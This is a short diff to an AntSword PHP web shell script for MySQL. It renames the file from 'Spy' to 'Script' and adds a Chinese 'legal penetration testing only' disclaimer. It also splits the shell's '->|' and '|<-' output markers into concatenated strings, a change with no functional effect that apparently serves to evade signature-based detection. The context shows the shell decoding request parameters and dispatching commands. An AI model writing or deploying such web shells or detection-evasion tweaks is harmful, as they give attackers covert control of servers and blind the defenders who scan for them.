@@ -6,8 +6,11 @@
 * | (_| | | | | |_ ___) \ V  V / (_) | | | (_| |
 *  \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|
 * ———————————————————————————————————————————————
-*     AntSword PHP Custom Spy for Mysql
-*                     Author:Medici.Yan
+*     AntSword PHP Custom Script for Mysql
+* 
+*     警告：
+*         此脚本仅供合法的渗透测试以及爱好者参考学习
+*          请勿用于非法用途，否则将追究其相关责任！
 * ———————————————————————————————————————————————
 *
 * 使用说明：
@@ -339,7 +342,7 @@ $z2 = decode(EC($_REQUEST['z2']));
 $z3 = decode(EC($_REQUEST['z3']));
 
 // echo "<meta HTTP-EQUIV=\"csontent-type\" content=\"text/html; charset={$cs}\">";
-echo "->|";
+echo "->"."|";
 $ret = "";
 try {
     switch ($funccode) {
@@ -402,5 +405,5 @@ try {
     $ret = "ERROR://".$e;
 }
 echo $ret;
-echo "|<-";
+echo "|"."<-";
 ?>
